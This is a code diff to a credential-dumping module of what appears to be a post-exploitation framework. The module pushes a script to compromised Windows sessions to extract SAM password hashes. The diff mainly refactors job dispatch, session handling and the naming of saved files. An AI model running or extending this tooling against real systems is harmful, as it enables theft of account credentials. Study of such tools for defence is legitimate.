@@ -11,6 +11,9 @@ class HashDumpSAMImplant(core.implant.Implant):
         self.options.register("RPATH", "%TEMP%", "remote file save path")
         self.options.register("GETSYSHIVE", "false", "Retrieve the system hive? (slower, but more reliable)",enum=["true", "false"])
 
+    def job(self):
+        return HashDumpSAMJob
+
     def run(self):
 
         import os.path
@@ -41,18 +44,20 @@ class HashDumpSAMImplant(core.implant.Implant):
         payloads = {}
         payloads["js"] = self.loader.load_script("data/implant/gather/hashdump_sam.js", self.options)
 
-        self.dispatch(payloads, HashDumpSAMJob)
+        self.dispatch(payloads, self.job)
 
 class HashDumpSAMJob(core.job.Job):
 
     def create(self):
+        if self.session_id == -1:
+            return
         if self.session.elevated != 1 and self.options.get("IGNOREADMIN") == "false":
             self.error("0", "This job requires an elevated session. Set IGNOREADMIN to true to run anyway.", "Not elevated", "")
             return False
 
     def save_file(self, data, name, encoder):
         import uuid
-        save_fname = self.options.get("LPATH") + "/" + name + "." + self.session.ip + "." + uuid.uuid4().hex
+        save_fname = self.options.get("LPATH") + "/" + name + "." + self.ip + "." + uuid.uuid4().hex
         save_fname = save_fname.replace("//", "/")
 
         with open(save_fname, "wb") as f:
